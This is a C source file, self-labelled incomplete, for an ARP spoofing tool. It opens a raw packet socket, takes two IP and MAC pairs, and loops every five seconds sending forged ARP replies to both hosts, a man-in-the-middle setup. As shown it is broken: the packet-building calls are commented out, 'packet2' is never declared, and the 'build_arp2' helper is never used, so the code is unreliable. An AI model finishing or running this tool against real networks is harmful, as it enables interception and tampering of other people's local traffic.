#include"headers.h"
#include"fatal.h"
#include"dump.h"
#include<linux/if.h>
#include"prand.h"
#include<linux/if_packet.h>
#include <sys/file.h>
#include <linux/raw.h>
#include"../head/build.h"
#include<netinet/if_ether.h>
#include<unistd.h>

/*
incomplete!
*/

void build_arp2(u_char *packet,u_char *mac_src,u_char *ip_src,u_char *mac_dest,u_char *ip_dest,int num);

struct ifreq ifr;
struct ifreq ifr_idx;
struct sockaddr_ll address;

void main(int argc,char *argv[]){

u_char packet1[ETHER_HEAD_LEN+sizeof(struct arp_hdr)],errbuf[PCAP_ERRBUF_SIZE];
int sock;
u_char mac_src[20],*device,*mac;

memset(mac_src,0,20);
memset(&ifr,0,sizeof(struct ifreq));
memset(&ifr_idx,0,sizeof(struct ifreq));
memset(&address,0,sizeof(struct sockaddr_in));
memset(packet1,0,ETHER_HEAD_LEN+sizeof(struct arp_hdr));
memset(packet2,0,ETHER_HEAD_LEN+sizeof(struct arp_hdr));

if(argc<5)
fatal("wrong usage:arppacket <1st IP> <1st MAC> <2nd IP> <2nd MAC>");

if((device = pcap_lookupdev(errbuf))==NULL)
fatal("looking up device");

strncpy(ifr.ifr_name,device,6);
strncpy(ifr_idx.ifr_name,device,6);

sock=socket(PF_PACKET,SOCK_RAW,htons(ETH_P_ALL));
if(sock==-1)
fatal("in socket");

if(ioctl(sock,SIOCGIFHWADDR,&ifr)==-1)
fatal("ioctl hwaddr");
if(ioctl(sock,SIOCGIFINDEX,&ifr_idx)==-1)
fatal("ioctl index");

address.sll_family=AF_PACKET;
address.sll_protocol  = htons(ETH_P_ALL);
address.sll_ifindex=ifr_idx.ifr_ifindex;
address.sll_halen=ETHER_ADDR_LEN;


/*
mac=ifr.ifr_hwaddr.sa_data;
sprintf(mac_src,"%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);

build_eth(packet1,argv[2],mac_src);
build_arp(packet1+ETHER_HEAD_LEN,mac_src,argv[3],argv[2],argv[1]);


build_eth(packet2,argv[4],mac_src);
build_arp(packet2+ETHER_HEAD_LEN,mac_src,argv[1],argv[4],argv[3]);
*/



dec_eth(packet2);
dec_arp(packet2+ETHER_HEAD_LEN);

while(1){
if((sendto(sock,packet1,ETHER_HEAD_LEN+sizeof(struct arp_hdr),0,(struct sockaddr *)&address,sizeof(address)))==-1)
fatal("while sending the 1st packet");

if((sendto(sock,packet2,ETHER_HEAD_LEN+sizeof(struct arp_hdr),0,(struct sockaddr *)&address,sizeof(address)))==-1)
fatal("while sending the 2nd packet");

printf("packets injected!\n");
usleep(5000000);
}
}




void build_arp2(u_char *packet,u_char *mac_src,u_char *ip_src,u_char *mac_dest,u_char *ip_dest,int num){

struct arp_hdr *arp = (struct arp_hdr *)packet;

sscanf(mac_src,"%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",&arp->sha[0],&arp->sha[1],&arp->sha[2],&arp->sha[3],&arp->sha[4],&arp->sha[5]);

sscanf(mac_dest,"%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",&arp->tha[0],&arp->tha[1],&arp->tha[2],&arp->tha[3],&arp->tha[4],&arp->tha[5]);

sscanf(ip_src,"%hhd.%hhd.%hhd.%hhd",&arp->spa[0],&arp->spa[1],&arp->spa[2],&arp->spa[3]);
sscanf(ip_dest,"%hhd.%hhd.%hhd.%hhd",&arp->tpa[0],&arp->tpa[1],&arp->tpa[2],&arp->tpa[3]);

arp->opcode=htons(2);
arp->plen=4;
arp->hlen=6;
arp->htype=htons(1);
arp->ptype=htons(2048);
}







 

